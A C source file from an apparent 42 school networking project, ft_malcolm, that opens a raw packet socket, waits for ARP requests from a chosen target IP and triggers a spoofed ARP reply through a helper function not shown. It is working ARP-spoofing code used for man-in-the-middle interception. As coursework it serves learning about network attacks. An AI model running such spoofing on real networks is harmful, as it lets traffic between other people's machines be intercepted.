/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ft_arp.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: irifarac <marvin@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/02/07 13:18:04 by irifarac          #+#    #+#             */
/*   Updated: 2025/02/11 20:50:48 by israel           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../include/ft_malcolm.h"
#include "../Libft/src/libft.h"

void	ft_set_arp_spoof(t_info info)
{
	struct sockaddr_ll	device;
	struct ether_header	*recv_eth;
	struct ether_arp	*recv_arp;
	int					sock;
	char				recv_buffer[42] = {0};
	char				spa[16] = {0};

	sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sock < 0)
	{
		perror("socket");
		return ;
	}
	ft_set_device(&info, &device);
	printf("ARP Spoofing is started\n");
	while (!stop)
	{
		ft_recv(sock, recv_buffer, sizeof(recv_buffer));
		recv_eth = (struct ether_header *)recv_buffer;
		recv_arp = (struct ether_arp *)(recv_buffer + sizeof(struct ether_header));
		if (ntohs(recv_eth->ether_type) == ETH_P_ARP &&
				ntohs(recv_arp->ea_hdr.ar_op) == ARPOP_REQUEST)
		{
			printf(TC_GRN"An ARP request has been broadcast.\n" TC_NRM);
			printf("received from %s\n", inet_ntoa(*(struct in_addr *)&recv_arp->arp_spa));
			ft_memcpy(spa, inet_ntoa(*(struct in_addr *)&recv_arp->arp_spa), 16);
			if (ft_strncmp(spa, info.ip_target, ft_strlen(info.ip_target)) == 0)
			{
				printf(
						TC_YEL "\tmac address of request: %s\n" TC_NRM,
						info.mac_target);
				printf(
						TC_YEL "\tIP address of request: %s\n"TC_NRM,
						info.ip_target);
				if (ft_send_arp(info, sock, recv_arp, recv_eth) < 0)
				{
					printf(TC_RED "ARP Spoofing is stopped\n" TC_NRM);
					break ;
				}
				printf(TC_RED "Exiting program...\n" TC_NRM);
				break ;
			}
			else
				printf("ARP request from unknown\n");
			printf("Received ARP request from %s\n", inet_ntoa(*(struct in_addr *)&recv_arp->arp_spa));
		}
		sleep(1);
	}
	printf(TC_RED "ARP Spoofing is stopped\n" TC_NRM);
	close(sock);
}
